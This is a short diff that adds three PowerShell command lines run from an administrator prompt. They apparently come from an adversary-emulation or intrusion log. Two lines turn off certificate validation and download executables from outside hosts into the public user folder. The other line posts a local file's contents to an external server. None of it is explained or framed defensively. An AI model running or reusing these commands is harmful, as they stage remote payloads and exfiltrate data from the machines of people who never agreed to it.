@@ -1,0 +1,5 @@
+PS C:\Users\ADMLA> $wc=New-Object System.Net.WebClient; $wc.Headers.add("file","cmxpress.exe"); [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $data=$wc.DownloadData("https://unikorn.azureedge.net/file/download"); [io.file]::WriteAllBytes("C:\Users\Public\cmxpress.exe",$data) | Out-Null;
+
+$filecontent = Get-Item -Path "C:\Users\Public\file.txt"; Invoke-WebRequest -Uri "https://unikorn.azureedge.net/file/upload" -Method POST -ContentType "text/plain" -Body $filecontent -DisableKeepAlive
+
+$wc=New-Object System.Net.WebClient; $wc.Headers.add("file","dlllstring.exe.zip"); [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;$data=$wc.DownloadData("https://c42caldera.com:8443/file/download"); [io.file]::WriteAllBytes("C:\Users\Public\dlllstring.exe.zip",$data) | Out-Null;
